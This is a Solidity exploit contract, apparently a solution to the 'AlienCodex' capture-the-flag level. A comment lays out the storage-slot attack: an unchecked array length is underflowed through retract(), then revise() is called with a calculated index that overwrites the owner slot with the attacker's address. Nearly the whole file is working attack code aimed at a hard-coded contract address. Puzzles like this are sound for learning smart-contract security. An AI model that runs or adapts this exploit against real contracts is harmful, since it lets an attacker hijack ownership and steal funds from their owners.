// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/**
    @title Hacker contrat for AlienCodex
    @notice When a dynamic array is declared, its length is stored in a slot 'p' and its elements are stored starting at keccak256(p) slot.
            When accessing an element of the array, Solidity checks that the index < length of the array.
            Since the contract has no guards for underflow, the length can be underflowed to 2**256-1 by calling retract.
            Then, any storage slot can be modified by passing the location of a slot in relation to the start of the array elements as an index.
*/

// 1. await contract.make_contact()
// 2. await contract.retract()

interface AlienCodex {
    function revise(uint, bytes32) external;
}

contract HackAlienCodex {
    AlienCodex toHack = AlienCodex(0x90dcf8eD035Cd310b65c5b68491B842134972444);

    function Attack() external {
        address newOwner = msg.sender;
        bytes32 content = bytes32(abi.encode(newOwner));
        uint index = type(uint).max - uint(keccak256(abi.encode(1))) + 1;
        toHack.revise(index, content);
    }
}